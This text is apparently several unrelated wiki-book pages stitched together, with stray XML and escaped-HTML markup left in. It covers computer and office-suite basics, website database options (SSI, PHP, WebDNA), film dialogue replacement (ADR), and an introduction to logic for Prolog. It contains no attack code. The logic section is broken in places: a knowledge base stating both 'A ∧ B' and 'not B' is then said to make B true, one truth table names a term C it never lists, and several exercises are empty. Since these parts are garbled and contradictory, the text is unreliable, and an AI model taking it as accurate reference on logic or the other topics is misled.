Electronic-mail, unlike regular mail, provides instant delivery to the recipient. Also, if both of you are simultaneously connected to the Internet, some programs will allow instant messaging. This is a means of communicating in real time. This can help save on expensive phone bills. There are services like Skype that allow phone calls over the Internet as well, and most of them are free!

A computer also provides a gateway to the WEB. A huge library filled with billions of pages that are packed with knowledge and games!

      <text xml:space="preserve">Office is commonly defined as a suite of programs made by Microsoft. They can accomplish many daily tasks, and are  one of the most commonly used programs of average computer people.

There are several programs in the [[Microsoft Office]] suite:

* Access, a database program
* Excel, a spreadsheet program
* Outlook, an email program
* PowerPoint, a presentation program
* Word, a word processor
* Publisher, a document publishing program

Also part of the Microsoft Office suite are: [[w:Microsoft Expression Web|Expression Web]] a web publishing program that replaced [[w:Microsoft FrontPage|Microsoft's FrontPage]] a discontinued Web site software, and [[w:Microsoft Visio|Visio]], a diagram making program.

Office suites are not made only by Microsoft. Some companies have taken their own stab at making these handy bundles of programming, and many have succeeded. If you don't want to shell out serious cash (hundreds of US dollars) for the latest version of Microsoft Office, you should take a look at [[w:OpenOffice.org|OpenOffice.org]], commonly known as OOo or OpenOffice, a free, open-source office suite which offers almost all the features of Microsoft Office and then some. KDE e.V. also makes an office suite for KDE called [[w:KOffice|Koffice]]. If you wish to have an alternative to Word, try [[w:AbiWord|AbiWord]].

Several online services like Google Docs also let you create and edit office programs.

Once you learn how to use one office program, you can figure out the basics of the other ones without much effort.

&lt;/div&gt;

To determine whether your site needs a database you need to examine how often you update your site, how much content you have, what your content is, how your site is updated, and more.

Automatic reasons to use a database is when you have a lot of content, content that is easiest to access through categories, if your site it updated by more than 2 people. If you update your site daily that implies having enough content to justify a database.

==Other Technology Options==
If a database isn't right for your site but you are still looking for ways to ease site updates, here are some options for you to consider.

===SSI===
SSI, or '''server side includes''' are good to use for navigation menus. (They are a type of '''shtml''', an extension of HTML that contains other useful '''server directives''' such as date and time.) By using includes, you can tell a page to ''include'' a separate file. The file will be loaded into that space when the page is loaded&amp;mdash;like copy-pasting by hand, except that server does it for you. So, if you wanted to have the same sidebar on a number of pages, you could create the sidebar in a separate .shtml file and tell each of your websites to include that page. That way, when you needed to change the navigation bar, you could change the one .shtml file instead of changing every single page.

The code looks like this:

  &lt;nowiki&gt;&lt;!-- #include file=&quot;navbar.shtml&quot; --&gt;&lt;/nowiki&gt;

Remember to name your files '''.shtml'''.

===PHP===
PHP stands for '''PHP: Hypertext Preprocessor''' and you can do really everything with it. It works very good with databases. Some code:

  &lt;nowiki&gt;&lt;?php print(&quot;Hello world!&quot;); ?&gt;&lt;/nowiki&gt;

As you see, it looks like C.

===WebDNA===
WebDNA is an easy to learn server-side scripting language specifically designed for the World Wide Web, with an Hybrid [http://en.wikipedia.org/wiki/In_memory_database in-memory databases] system making easy to build resilient database-driven websites.

'''Example Code''' (connects to a whois server and shows the information, then stores it into a permanent database)
&lt;pre&gt;[text]info=[tcpconnect host=whois.domaindiscover.com&amp;port=43]
[tcpsend]webdna.us[unurl]%0D%0A[/unurl][/tcpsend]
[/tcpconnect][/text]

[append db=base.db]domain=webdna.us&amp;whois=[info]
[/append]
&lt;/pre&gt;

ADR- Automated Dialog Replacement, (also referred to as &quot;Looping&quot;): The replacement of dialog in post-production of a film or video. This is done with the vast majority of feature sound tracks. Often, the &quot;sync&quot; sound recorded on the set is sub-par because of ambient noise, set acoustics, or talent deficiency. Sometimes it is requested by the producer. For instance, all Mel Gibson's dialog was replaced in the original &quot;Mad Max&quot; movie because the distributor felt his Australian accent was too distracting.

Historically, film stock was spliced into a loop of the segment of the dialog being replaced and this segment was interlocked to an audio recording device. The actor would then watch the picture and listen to the sync sound while repeating the phrase ad nauseum until the director was satisfied the take was perfect. This has been replaced (except the &quot;ad nauseum&quot; part) by computerized workstations which greatly enhance the workflow as well as giving distinct advantages to further post production audio work such as &quot;sweetening&quot;.

Also known as:

Additional Dialog Recording

===ADR in India - MOS===

The best place to learn about ADR is India.  In southern India (as well as occasionally in some countries in Europe), 35mm motion pictures are shot MOS (The actual origin of the abbreviation MOS and therefore its meaning is not doubtlessly to be specified; it's often referred to the legend that a German-speaking film director translated badly  &quot;Mit Ton aus&quot; into &quot;with out sound&quot; ).  Then all the dialog is added later using ADR.  This means '''none''' of the dialog is in sync.

Question: Why do they do this?  Answer: India has over 30 languages.  Actually, India is like a group of countries, each speaking their own language.  Therefore, a motion picture for the Indian market must be dubbed into many different languages.

In Madras 80% of heroines and 50% heroes do not speak the language in which the movie is made. So they are left with no other option but to do ADR.  The dts technology help them to do different language shows with same print.That is why 60%of theatres are dts ready.

All except one of the dubs would look out of sync... even if they used sync sound.  So why not have them all out of sync by not using any sync sound?  The logic of this might not seem ideal but the economics is wonderful. 

By shooting MOS, you do not have to worry about noise on the movies set.  That saves you 50% of your time right there.  You don't have to worry about getting actors who can say their lines clearly.  You don't have to use movie cameras which have accurate motors.   You don't need a clapper to keep the audio in sync.  (Note:  In Madras, many of the profitable, low-budget comedies are filmed with an old Arri &quot;C&quot; camera.  You can never get sync sound with that camera because of the noise and the less-than-perfect motor speed.)

In case you think that this is just one or two movies, remember that in Madras (Chennai), India, more motion pictures are filmed each year than in any other city in the world... including Hollywood.

In case you think that no professional movie will ever be filmed this way, look at &quot;The Good, the Bad, and the Ugly&quot;.  Almost all of the dialog shots were filmed MOS.  Even the Indian people like to watch the later dubbed sound instead of the sync sound.

The secret of doing movies MOS and adding all the dialog later via ADR is the quality of the actor's voices.  If you have highly skilled actors with good vocal control doing the ADR for the '''entire''' movies, the results are more than acceptable.  The voice actors for &quot;The Good, the Bad and the Ugly&quot; had been doing radio dramas for years when they did the ADR for this movie for all but the principle characters in the movie, most of whom were speaking another language.

ADR does not work as well when you mix shots done MOS with shots done with sync sound.  Then people can hear the difference.  Some movies get away with mixing MOS shots with sync sound shots by using sync sound only for close-up shots and using MOS for all the rest of the motion picture.

===ADR in Schools - DV Camcorder===

The future of shooting motion pictures using '''total ADR''' never looked brighter.  In theory, it is possible to film a motion picture with a DV Camcorder or an HD camcorder by using the built-in microphone to create a '''scratch track''' and then replacing '''all''' the dialog using ADR.  Having a scratch track means you have a guide for both the voice actors but also for the audio engineer who must sync the two together.  aligning newly recorded dialog to match a scratch track is easy.  This way, you get perfect sync every time.  That is why this method is ideal for high schools when they begin to make their own, yearly motion pictures. The scratch track can be extremely noisy but the final movie will have perfectly clear dialog.

Remember:  For most motion pictures, '''all audio''' except the dialog is replaced in post production.  If you also replace the dialog, you have an extremely clear sound track for your motion picture.  So using a scratch track, you can make acceptable movies.

Naturally, a movie with little talking (a Western) will work better with ADR than a movie which has lots of verbal emotion.

===Setup for ADR===

Here is what you need to do your own ADR:

;The Room :The biggest problem with doing ADR for a low budget motion picture is building the recording studio.  Getting a good sounding room which is totally quiet is not easy in a high school. 

;The Computer :Most computers, including laptops, are '''not''' silent.  The noise of the disk drive is enough to ruin the audio.  Therefore, the computer must be outside the room where the microphone is.

;The Software :If your budget is extremely low, you can use GarageBand 3 to do ADR looping.  You just need a program which can play the movie while you record the dialog.

:A better alternative is a music program.  Most music programs now include full DAW functionality.  Get one which is easy to use.

;Professional Software titles like Gallery's ADRStudio are widely used for Professional ADR sessions.  Steinberg's &quot;Nuendo&quot; and Digidesign's &quot;Pro Tools&quot; are two audio software applications commonly used for post-production and are available on both Macintosh and Windows platforms but these do not have the specialist features of titles like ADRStudio or VoiceQ ADR. Features such as the script text scrolling on the screen as the video file plays and audible 'cues' playing without manual intervention. Gallery's VoicePro software is used for Video Game Dialog Recording. Another available Windows software is Dialog ADR and Dialog Spotting designed by ZIO AUDIO in Spain.

;The Interface :You need a good way to convert the signal from a professional microphone to a digital waveform in the computer.  Many Firewire and USB microphone amplifiers are now available which will accept a balanced microphone jack.

;The Microphone :Good microphones are expensive.  And they are fragile.  Anything less and you will notice the difference in quality, although in the last 10 years prices of acceptable models have come down to less than a fifth the price of the traditionally used high end Sennheisers, Neumanns and AKGs.

===Facts about ADR===

Robert Rodriquez did not use '''any''' sync sound for his first feature-length motion picture.  Instead, he recorded the audio immediately '''after''' filming the scene.  As anyone in Hollywood will tell you, this is impossible.  So, if you are going to bend the rules in filmmaking, you must understand how everything works.  Note: When Robert Rodriquez makes a movie, he usually creates a 10-minute film school documentary.  Watch these and learn.

Look at any motion picture filmed before about 1980... specially the outdoor scenes.  Anytime you hear completely clear dialog from the actors, it was probably done with ADR.  Once you start looking, you will be amazed how many movies used ADR that you thought were live recording on the movie set.

Now there are programs such as VocAlign which will take audio recorded in ADR (even in a foreign language) and reshape the audio to match the lip sync in the original audio.

      <text xml:space="preserve">Since prolog is based heavily on formal logic, it's useful to have some experience with it before starting to learn prolog. This is a short introduction to logic for people who want to learn prolog. It will discuss two logical languages: propositional logic and first-order logic.

== Propositional Logic ==

Propositional logic has two basic elements, '''terms''' and '''connectives'''. Terms are represented by letters (usually uppercase), and represent the values '''true''' and '''false''', ie. a term can be either true or false, though it doesn't always have to be made clear which they represent. They are in this sense, like variables in mathematics, they represent an unknown value.

Connectives, like the word suggests, connect two terms. The result of this connection takes on the value true or false, based on the values of the two terms. Consider, for instance, the connective AND. It could connect the terms A and B to make the logical sentence &quot;A AND B&quot; (Anything that can take on the values true or false is called a sentence). The sentence &quot;A AND B&quot; is true if both A and B are true. If one or both of them are false, the sentence is false. Connectives are usually represented by symbols rather than words. The following table shows the most commonly used connectives, their meaning and the symbols that are often used to represent them.

&lt;center&gt;
  &lt;table style='border-collapse:collapse;border:none'&gt;
  &lt;tr&gt;
    &lt;th style='border:solid windowtext 1.0pt'&gt; Name &lt;/th&gt;
    &lt;th style='border:solid windowtext 1.0pt'&gt; Usage &lt;/th&gt;
    &lt;th style='border:solid windowtext 1.0pt'&gt; Translate &lt;/th&gt;
    &lt;th style='border:solid windowtext 1.0pt'&gt; Meaning &lt;/th&gt;
    &lt;th style='border:solid windowtext 1.0pt'&gt; symbols &lt;/th&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td style='border:solid windowtext 1.0pt'&gt; conjunction  &lt;/td&gt;
    &lt;td style='border:solid windowtext 1.0pt'&gt; &lt;math&gt;A \land B &lt;/math&gt;&lt;/td&gt;
    &lt;td style='border:solid windowtext 1.0pt'&gt; A and B  &lt;/td&gt;
    &lt;td style='border:solid windowtext 1.0pt'&gt; the sentence is true if and only if both terms are true   &lt;/td&gt;
    &lt;td style='border:solid windowtext 1.0pt'&gt; &lt;math&gt; \land \quad , &lt;/math&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td style='border:solid windowtext 1.0pt'&gt; disjunction   &lt;/td&gt;
    &lt;td style='border:solid windowtext 1.0pt'&gt;  &lt;math&gt;A \lor B &lt;/math&gt; &lt;/td&gt;
    &lt;td style='border:solid windowtext 1.0pt'&gt; A or B  &lt;/td&gt;
    &lt;td style='border:solid windowtext 1.0pt'&gt; the sentence is true if one or both of the terms are true &lt;/td&gt;
    &lt;td style='border:solid windowtext 1.0pt'&gt; &lt;math&gt; \lor \quad ;&lt;/math&gt; &lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td style='border:solid windowtext 1.0pt'&gt; exclusive or  &lt;/td&gt;
    &lt;td style='border:solid windowtext 1.0pt'&gt; &lt;math&gt;A \oplus B &lt;/math&gt;&lt;/td&gt;
    &lt;td style='border:solid windowtext 1.0pt'&gt; A xor B  &lt;/td&gt;
    &lt;td style='border:solid windowtext 1.0pt'&gt; the sentence is true if one of the terms is true, but not both &lt;/td&gt;
    &lt;td style='border:solid windowtext 1.0pt'&gt; &lt;math&gt;\oplus \quad \underline {\lor} \quad&lt;/math&gt; &lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td style='border:solid windowtext 1.0pt'&gt; negation  &lt;/td&gt;
    &lt;td style='border:solid windowtext 1.0pt'&gt; &lt;math&gt;\lnot A &lt;/math&gt; &lt;/td&gt;
    &lt;td style='border:solid windowtext 1.0pt'&gt; not A &lt;/td&gt;
    &lt;td style='border:solid windowtext 1.0pt'&gt; the sentence is true if the term is false and false if the term is true &lt;/td&gt;
    &lt;td style='border:solid windowtext 1.0pt'&gt; &lt;math&gt; \sim  \quad \lnot \quad \bar {q}&lt;/math&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td style='border:solid windowtext 1.0pt'&gt; implication &lt;/td&gt;
    &lt;td style='border:solid windowtext 1.0pt'&gt;  &lt;math&gt;A \rightarrow B &lt;/math&gt;&lt;/td&gt;
    &lt;td style='border:solid windowtext 1.0pt'&gt; A logically implies B &lt;/td&gt;
    &lt;td style='border:solid windowtext 1.0pt'&gt; if A is true the sentence is true only if B is true, if A is false, the sentence is true &lt;/td&gt;
    &lt;td style='border:solid windowtext 1.0pt'&gt; &lt;math&gt; \rightarrow \quad \Rightarrow \quad \models&lt;/math&gt; &lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td style='border:solid windowtext 1.0pt'&gt; equality &lt;/td&gt;
    &lt;td style='border:solid windowtext 1.0pt'&gt;  &lt;math&gt;A \leftrightarrow B &lt;/math&gt;&lt;/td&gt;
    &lt;td style='border:solid windowtext 1.0pt'&gt; A is logically equivalent to B &lt;/td&gt;
    &lt;td style='border:solid windowtext 1.0pt'&gt; the sentence is true if both terms are true or if both terms are false &lt;/td&gt;
    &lt;td style='border:solid windowtext 1.0pt'&gt; &lt;math&gt; \leftrightarrow \quad \Leftrightarrow \quad =&lt;/math&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;/table&gt;
&lt;/center&gt;

Beware of the meaning of implication, as it can be counter-intuitive. &lt;math&gt;A \rightarrow \; B&lt;/math&gt; basically says, if A is true, then so is B, otherwise B can be either true or false.

Since each term can only take on two values, all possibilities can easily be enumerated in a so-called ''truth table'':
&lt;center&gt;
&lt;table cellpadding=&quot;5&quot; frame=box&gt;
  &lt;tr&gt;
    &lt;th style='border-right:1px solid black'&gt; &lt;math&gt;A&lt;/math&gt; &lt;/th&gt;
    &lt;th style='border-right:1px solid black'&gt; &lt;math&gt;B&lt;/math&gt; &lt;/th&gt;
    &lt;th&gt;&lt;/th&gt;
    &lt;th style='border-left:1px solid black;border-right:1px solid black'&gt; &lt;math&gt;A \land B &lt;/math&gt;&lt;/th&gt;
    &lt;th style='border-right:1px solid black'&gt; &lt;math&gt;A \lor B &lt;/math&gt;&lt;/th&gt;
    &lt;th style='border-right:1px solid black'&gt; &lt;math&gt;A \oplus B &lt;/math&gt;&lt;/th&gt;
    &lt;th style='border-right:1px solid black'&gt; &lt;math&gt;\neg A &lt;/math&gt;&lt;/th&gt;
    &lt;th style='border-right:1px solid black'&gt; &lt;math&gt;A \Rightarrow \; B &lt;/math&gt;&lt;/th&gt;
    &lt;th&gt; &lt;math&gt;A \Leftrightarrow \; B &lt;/math&gt;&lt;/th&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td bgcolor=&quot;lightgrey&quot;&gt; F &lt;/td&gt;
    &lt;td bgcolor=&quot;lightgrey&quot;&gt; F &lt;/td&gt;
    &lt;td style='border-left:1px solid black;border-right:1px solid black'/&gt;
    &lt;td bgcolor=&quot;lightgrey&quot;&gt; F &lt;/td&gt;
    &lt;td bgcolor=&quot;lightgrey&quot;&gt; F &lt;/td&gt;
    &lt;td bgcolor=&quot;lightgrey&quot;&gt; F &lt;/td&gt;
    &lt;td bgcolor=&quot;ghostwhite&quot;&gt; T &lt;/td&gt;
    &lt;td bgcolor=&quot;ghostwhite&quot;&gt; T &lt;/td&gt;
    &lt;td bgcolor=&quot;ghostwhite&quot;&gt; T &lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td bgcolor=&quot;lightgrey&quot;&gt; F &lt;/td&gt;
    &lt;td bgcolor=&quot;ghostwhite&quot;&gt;T &lt;/td&gt;
    &lt;td style='border-left:1px solid black;border-right:1px solid black'/&gt;
    &lt;td bgcolor=&quot;lightgrey&quot;&gt; F &lt;/td&gt;
    &lt;td bgcolor=&quot;ghostwhite&quot;&gt;T &lt;/td&gt;
    &lt;td bgcolor=&quot;ghostwhite&quot;&gt;T &lt;/td&gt;
    &lt;td bgcolor=&quot;ghostwhite&quot;&gt;T &lt;/td&gt;
    &lt;td bgcolor=&quot;ghostwhite&quot;&gt;T &lt;/td&gt;
    &lt;td bgcolor=&quot;lightgrey&quot;&gt; F &lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td bgcolor=&quot;ghostwhite&quot;&gt;T &lt;/td&gt;
    &lt;td bgcolor=&quot;lightgrey&quot;&gt; F &lt;/td&gt;
    &lt;td style='border-left:1px solid black;border-right:1px solid black'/&gt;
    &lt;td bgcolor=&quot;lightgrey&quot;&gt; F &lt;/td&gt;
    &lt;td bgcolor=&quot;ghostwhite&quot;&gt;T &lt;/td&gt;
    &lt;td bgcolor=&quot;ghostwhite&quot;&gt;T &lt;/td&gt;
    &lt;td bgcolor=&quot;lightgrey&quot;&gt; F &lt;/td&gt;
    &lt;td bgcolor=&quot;lightgrey&quot;&gt; F &lt;/td&gt;
    &lt;td bgcolor=&quot;lightgrey&quot;&gt; F &lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td bgcolor=&quot;ghostwhite&quot;&gt;T &lt;/td&gt;
    &lt;td bgcolor=&quot;ghostwhite&quot;&gt;T &lt;/td&gt;
    &lt;td style='border-left:1px solid black;border-right:1px solid black'/&gt;
    &lt;td bgcolor=&quot;ghostwhite&quot;&gt;T &lt;/td&gt;
    &lt;td bgcolor=&quot;ghostwhite&quot;&gt;T &lt;/td&gt;
    &lt;td bgcolor=&quot;lightgrey&quot;&gt; F &lt;/td&gt;
    &lt;td bgcolor=&quot;lightgrey&quot;&gt; F &lt;/td&gt;
    &lt;td bgcolor=&quot;ghostwhite&quot;&gt;T &lt;/td&gt;
    &lt;td bgcolor=&quot;ghostwhite&quot;&gt;T &lt;/td&gt;
  &lt;/tr&gt;
&lt;/table&gt;
&lt;/center&gt;

The next step is to connect these sentences, using connectives, to make more complex sentences, such as &lt;math&gt;(A \land B) \Rightarrow \; (B \Leftrightarrow \; A)&lt;/math&gt; or &lt;math&gt;((A \lor C) \lor (A \lor D))&lt;/math&gt;. In the last sentence, the brackets can be omitted, since &lt;math&gt;A \lor (B \lor C)&lt;/math&gt; is the same as &lt;math&gt;(A \lor B) \lor C&lt;/math&gt;. However, when in doubt, it's best to use brackets to make the meaning of the sentence completely clear.

You can analyse complex sentences with truth tables as well:

&lt;center&gt;
&lt;table cellpadding=&quot;5&quot; frame=box&gt;
  &lt;tr&gt;
    &lt;th&gt;&lt;math&gt;A&lt;/math&gt; &lt;/th&gt;
    &lt;th&gt;&lt;math&gt;B&lt;/math&gt; &lt;/th&gt;
    &lt;th /&gt;
    &lt;th&gt;&lt;math&gt;A \land B&lt;/math&gt; &lt;/th&gt;
    &lt;th&gt;&lt;math&gt;A \lor B&lt;/math&gt; &lt;/th&gt;
    &lt;th&gt;&lt;math&gt;(A \land B) \lor (A \land C)&lt;/math&gt; &lt;/th&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td bgcolor=&quot;lightgrey&quot;&gt;  F&lt;/td&gt;
    &lt;td bgcolor=&quot;lightgrey&quot;&gt;  F&lt;/td&gt;
    &lt;td /&gt;
    &lt;td bgcolor=&quot;lightgrey&quot;&gt;  F&lt;/td&gt;
    &lt;td bgcolor=&quot;lightgrey&quot;&gt;  F&lt;/td&gt;
    &lt;td bgcolor=&quot;lightgrey&quot;&gt;  F&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td bgcolor=&quot;lightgrey&quot;&gt;  F&lt;/td&gt;
    &lt;td bgcolor=&quot;ghostwhite&quot;&gt; T&lt;/td&gt;
    &lt;td /&gt;
    &lt;td bgcolor=&quot;lightgrey&quot;&gt;  F&lt;/td&gt;
    &lt;td bgcolor=&quot;ghostwhite&quot;&gt; T&lt;/td&gt;
    &lt;td bgcolor=&quot;ghostwhite&quot;&gt; T&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td bgcolor=&quot;ghostwhite&quot;&gt; T&lt;/td&gt;
    &lt;td bgcolor=&quot;lightgrey&quot;&gt;  F&lt;/td&gt;
    &lt;td /&gt;
    &lt;td bgcolor=&quot;lightgrey&quot;&gt;  F&lt;/td&gt;
    &lt;td bgcolor=&quot;ghostwhite&quot;&gt; T&lt;/td&gt;
    &lt;td bgcolor=&quot;ghostwhite&quot;&gt; T&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td bgcolor=&quot;ghostwhite&quot;&gt; T&lt;/td&gt;
    &lt;td bgcolor=&quot;ghostwhite&quot;&gt; T&lt;/td&gt;
    &lt;td /&gt;
    &lt;td bgcolor=&quot;ghostwhite&quot;&gt; T&lt;/td&gt;
    &lt;td bgcolor=&quot;ghostwhite&quot;&gt; T&lt;/td&gt;
    &lt;td bgcolor=&quot;ghostwhite&quot;&gt; T&lt;/td&gt;
  &lt;/tr&gt;
&lt;/table&gt;
&lt;/center&gt;

We can now divide sentences in to three groups: '''valid''', '''unsatisfiable''' and '''satisfiable'''.
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Valid&lt;/strong&gt; sentences (aka &lt;strong&gt;tautologies&lt;/strong&gt;) are &lt;strong&gt;always true&lt;/strong&gt;, no matter what values their terms take.&lt;br&gt;Examples of valid sentences include&lt;ol&gt;&lt;li&gt;'''A or (not A)'''&lt;/li&gt;&lt;li&gt;'''A =&gt; A'''&lt;/li&gt;&lt;li&gt;'''(A =&gt; B) or (A and (not B))&lt;/li&gt;&lt;/ol&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Unsatisfiable&lt;/strong&gt; sentences (aka &lt;strong&gt;inconsistencies&lt;/strong&gt;) are &lt;strong&gt;always false&lt;/strong&gt;, no matter what values their terms take.&lt;br&gt;Examples of unsatisfiable sentences include&lt;ol&gt;&lt;li&gt;'''A and (not A)'''&lt;/li&gt;&lt;li&gt;'''(A =&gt; B) and (A and (not B))'''&lt;/li&gt;&lt;/ol&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Satisfiable&lt;/strong&gt; sentences (aka &lt;strong&gt;contingencies&lt;/strong&gt;) are those that can be &lt;strong&gt;either true or false&lt;/strong&gt;, depending on the values that their terms take.&lt;br&gt;Examples of satisfiable sentences include&lt;ol&gt;&lt;li&gt;'''A'''&lt;/li&gt;&lt;li&gt;'''A or B'''&lt;/li&gt;&lt;li&gt;'''A and B'''&lt;/li&gt;&lt;/ol&gt;&lt;/li&gt;
&lt;/ul&gt;

== Meaning and Intention ==

It's very important in logical languages to realize that these sentences can be used in different ways. &lt;math&gt; A \wedge B &lt;/math&gt;, for instance, does not imply any meaning on its own. It's just a formal way of creating logical constructions. Someone can state that &lt;math&gt; A \wedge B &lt;/math&gt; is true, which would give the sentence a meaning (namely that A and B are both true), which can be used to derive further truths if other things are known about A and B. Someone might also ask if &lt;math&gt; A \wedge B &lt;/math&gt; is true, to which the person asked this would have to find an answer based on things already known about A and B. In other words, a logical sentence on its own doesn't mean anything. The reader needs to know the intention behind the sentence (usually question or statement) to be able to do something with it. 
A common construct in logic is a knowledge base, a collection of sentences that are stated to be true, and a single sentence that is posed as a question. The question is whether the question is true, given the knowledge base. Consider, for instance, the following knowledge base:&lt;br&gt;
&lt;br&gt;
&lt;math&gt; A \wedge B &lt;/math&gt;&lt;br&gt;
&lt;math&gt; ~B &lt;/math&gt;&lt;br&gt;
&lt;br&gt;
With the question &lt;br&gt;
&lt;br&gt;
&lt;math&gt;A&lt;/math&gt;&lt;br&gt;
&lt;br&gt;
That is, is A true, given that the Knowledge base is. It's clear that the question is indeed true, since &lt;math&gt; A \wedge B &lt;/math&gt; is true, and B is too. This knowledge base/question construction is in fact the way that prolog works. You write a knowledge base (your program) and ask prolog a question. In comparison to conventional programming languages, the knowledgebase is your program, the question is its input and prolog resolving your question is the running of the program.

== First Order Logic ==

First Order Logic (also known as predicate logic) expands on propositional logic, by using predicates, variables and objects. In propositional logic, the atomic sentences (the smallest elements that can take on a true/false value) are terms, symbols represented by letters. In first order logic the atomic sentences are '''predicates'''. Predicates have a name (starting with a capital) which is followed by several '''variables''' (starting with a lowercase letter). The following are examples of predicates:

*Predicate(variable1, variable2)
*BrotherOf(sibling, brother)
*MotherOf(child, mother)
*HasWheels(thing)

These variables can be instantiated with '''objects'''. Objects are elements represented by words that start with a capital letter. For instance, in the predicate &lt;math&gt;HasWheels(thing)&lt;/math&gt; the variable ''thing'' can be instantiated with the objects ''Car'', ''Bike'', or ''Banana''. Based on the instantiation of the variables, the predicate is true or false (&lt;math&gt;HasWheels(Car)&lt;/math&gt; is true whereas &lt;math&gt;HasWheels(Banana)&lt;/math&gt; is false). Note however that these names are for readability only, they do not actually mean anything. &lt;math&gt;HasWheels(Banana)&lt;/math&gt; is not functionally different from &lt;math&gt;X(A)&lt;/math&gt;, or indeed &lt;math&gt;WrUlS(OvqPv)&lt;/math&gt;. Whether &lt;math&gt;HasWheels(Banana)&lt;/math&gt;is true or false needs to be defined in some formal way (such as a knowledge base, which is described below).

These predicates can be joined in sentences, just like the terms in propositional logic, using connectives (the connectives are the same as in propositional logic). Usually there is a collection of sentences that are assumed to be true, to create a logical definition of predicates. Such a collection of sentences that are true is called a '''knowledge base'''. Such a knowledge base could, for instance contain the following sentences:

HasWheels(Car)&lt;br&gt;
MotherOf(Charles, Elizabeth)

The sentences tell us that the HasWheels predicate is true, if its first element is car; and the MotherOf predicate is true, if its first element is Charles and the second is Elizabeth. To construct this kind of sentences with variables in them we need to state what exactly we mean when we use the variables. If HasWheels(x) is true, do we mean it's true for instantiations of x or that there exists an instantiation of x that makes HasWheels(x) true? To define this we use '''quantifiers''', ie. they determine the quantity of a variable.
First order logic has two quantifiers, the '''universal quantifier''' &lt;math&gt;\forall&lt;/math&gt; and the '''existential quantifier''' &lt;math&gt;\exists&lt;/math&gt;. These quantifiers are placed before a variable to signify what the variable means in the sentence that follows the quantifier. For instance, the sentence &lt;math&gt;\forall x HasWheels(x)&lt;/math&gt; means that for all possible instantiations of x, HasWheels(x) is true, that is, all possible objects have wheels. The sentence &lt;math&gt;\exists x HasWheels(x)&lt;/math&gt; means that there exists at least one object x for which HasWheels(x) is true, in other words there is at least one thing that has wheels. To understand the use of the quantifiers, consider the following examples:

* If x is a land vehicle, then x has wheels. (if x is not a landvehicle, this sentence says nothing about x)
&lt;math&gt;\forall {x} LandVehicle(x) \Rightarrow HasWheels(x)&lt;/math&gt; 
* If x has a child y and x is a man, x is the father of y.
&lt;math&gt;\forall {x, y} HasChild(x, y) \wedge Man(x) \Rightarrow FatherOf(y, x)&lt;/math&gt;
* There exists at least one object that has wheels and isn't a car
&lt;math&gt;\exists {x} HasWheels(x) \wedge \sim Car(x)&lt;/math&gt;
* All mothers have a child
&lt;math&gt;\forall {x} Mother(x) \Rightarrow \exists {y} Child(y) \wedge HasChild(x, y)&lt;/math&gt;

== Logic in Prolog ==

The logic used in prolog is a version of first order logic, with the use of capital letters inverted (predicates and objects start with a lowercase letter, variables start with an uppercase letter). A prolog program consists of a knowledge base where each sentence is a conjunction of predicates connected to a final predicate with an implication. For instance:&lt;br&gt;&lt;br&gt;

&lt;math&gt;\forall a,b,c,d Pred1(a, b) \wedge Pred2(b, c) \wedge Pred3(c, d) \Rightarrow Pred4(a) &lt;/math&gt;&lt;br&gt;&lt;br&gt;

A sentence like this is called a Horn Clause.
In prolog the above sentence would look like this:&lt;br&gt;&lt;br&gt;

'''pred4(A) :- pred1(A, B), pred2(B, C), pred3(C, D).'''&lt;br&gt;&lt;br&gt;

Note that the implication sign is reversed, commas are used for conjunction, a period is used to end the sentence and all variables are assumed to be universally quantified.

== Examples ==

== Exercises ==
&lt;br&gt;
(x) Write out a truth table for the following sentences in propositional logic.   &lt;br&gt;
a) &lt;math&gt; (A \wedge B) V C&lt;/math&gt;   &lt;br&gt;
b) &lt;math&gt; A&lt;/math&gt;   &lt;br&gt;
c) &lt;math&gt; A&lt;/math&gt;   &lt;br&gt;
d) &lt;math&gt; A&lt;/math&gt;   &lt;br&gt;
e) &lt;math&gt; A&lt;/math&gt;   &lt;br&gt;
&lt;br&gt;
(x) How many connectives are possible, that connect two terms? Why?   &lt;br&gt;
&lt;br&gt;
(x) Try to find a formula to fit the following truth tables   &lt;br&gt;
a)   &lt;br&gt;
b)   &lt;br&gt;
c)   &lt;br&gt;
d)   &lt;br&gt;
&lt;br&gt;
(x) Truth tables are a great way to prove that a propositional formula is true. Could you do the same thing for first order logic? Explain how, or why not.   &lt;br&gt;
&lt;br&gt;
(x) Convert the following sentences to first order logic. Try to follow the logical structure of the sentence closely (using objects for individuals, variables for groups of people, connectives for logical constructions and predicates for the rest).   &lt;br&gt;
a) All kids are short.   &lt;br&gt;
b) Certain kids own shoes.   &lt;br&gt;
b) If someone is a kid and a boy, he likes cars.   &lt;br&gt;
d) All kids that own shoes, wear them.   &lt;br&gt;
e) All kids have a mother.   &lt;br&gt;
f) If a woman is a mother, she has a kid.   &lt;br&gt;
g) No kid likes a vegetable if it's overcooked.   &lt;br&gt;
h) No mother likes a teacher if he punishes her kid.   &lt;br&gt;
&lt;br&gt;
(x) (''advanced'')The following questions concern the = symbol. It takes two variables and is true if they are bound to the same thing, in other words x = y is true if x and y represent the same object.&lt;br&gt;
(a) Is the = symbol a function, predicate or a connective? Why?&lt;br&gt;
(b) The = symbol shouldn't be confused with the equality connective. How are the different?&lt;br&gt;
